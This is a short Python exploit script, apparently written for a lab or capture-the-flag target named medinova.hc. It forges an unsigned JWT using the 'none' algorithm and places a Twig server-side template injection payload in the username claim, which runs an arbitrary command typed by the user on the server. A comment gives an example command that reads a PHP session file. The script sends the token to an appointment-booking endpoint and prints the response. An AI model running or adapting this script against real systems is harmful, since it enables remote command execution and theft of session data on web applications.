import requests
import base64
import urllib.parse
import sys

# Inputs
comando = input()
session = input()


# Header
token_header_encoded = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0='
token_header_encoded = urllib.parse.quote(token_header_encoded, safe='')
# Payload
token_payload = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{comand}')}}".format(comand=comando).replace("{","{{").replace("}","}}")
token_payload_complete = '{"username":"'+token_payload+'","iat":1685129996,"exp":1685216396}'
token_payload_encoded = base64.b64encode(token_payload_complete.encode("utf-8")).decode("utf-8") 
token_payload_encoded = urllib.parse.quote(token_payload_encoded, safe='')

# Token complete
token = token_header_encoded+"."+token_payload_encoded+"."

# Example SSTI
#{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /var/lib/php/sessions/sess_equtuf31ndjeloul0o9hep61i6')}}

url = "http://medinova.hc/?page=make_appointment"
cookies = {"token":token,"PHPSESSID":session}
data = {"department":"2","doctor":"1","username":"name","email":"ola%40das.cl","date":"05%2F30%2F2023","time":"5%3A06+PM"}
#department=1&doctor=1&username=a&email=adsa%40das.cl&date=05%2F26%2F2023&time=8%3A05+PM

#Request
#department=2&doctor=1&username=oad&email=ola%40das.cl&date=05%2F25%2F2023&time=5%3A06+PM
#POST

# In case you want to debug
"""
print("url:", url)
print("token header:",token_header_encoded)
print("token payload sin encodear", token_payload_complete)
print("token payload encodeado:", token_payload_encoded)
print("token completo:",token)
#sys.exit()
"""
response = requests.post(url, cookies=cookies, data=data)
print(response.text)

 
